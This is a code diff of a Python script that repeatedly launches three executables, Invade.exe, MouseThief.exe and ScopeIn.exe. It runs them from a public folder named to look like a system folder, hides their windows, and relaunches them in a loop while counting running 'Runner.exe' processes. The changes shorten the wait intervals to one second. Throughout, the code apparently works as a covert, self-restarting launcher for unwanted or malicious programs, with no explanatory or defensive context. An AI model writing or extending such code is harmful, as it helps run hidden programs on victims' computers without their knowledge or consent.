@@ -8,9 +8,9 @@ path = 'C:/Users/Public/Kernal46/'
 #invade = os.path.join(path, 'Invade.exe')
 #mouseThief = os.path.join(path, 'MouseThief.exe')
 #scopeIn = os.path.join(path, 'ScopeIn.exe')
-invade = os.path.join(path, 'dist/Invade/Invade.exe')
-mouseThief = os.path.join(path, 'dist/MouseThief/MouseThief.exe')
-scopeIn = os.path.join(path, 'dist/ScopeIn/ScopeIn.exe')
+invade = os.path.join(path, 'C:/Users/Public/Kernal46/dist/Invade/Invade.exe')
+mouseThief = os.path.join(path, 'C:/Users/Public/Kernal46/dist/MouseThief/MouseThief.exe')
+scopeIn = os.path.join(path, 'C:/Users/Public/Kernal46/dist/ScopeIn/ScopeIn.exe')
 print(invade)
 
 CREATE_NO_WINDOW = 0x08000000
@@ -25,7 +25,7 @@ print('count is', len(runners))
 if (len(runners) > 2):
     continueRunning = False
 
-sleep(30)
+sleep(1)
 while continueRunning:
     count = sum(1 for proc in psutil.process_iter() if proc.name() == 'Runner.exe')
     print('count is currently', count)
@@ -51,6 +51,6 @@ while continueRunning:
             subprocess.call(scopeIn, creationflags = CREATE_NO_WINDOW)
         else:
             print('already running scopeIn')
-    sleep(100)
+    sleep(1)
 
 print('done')
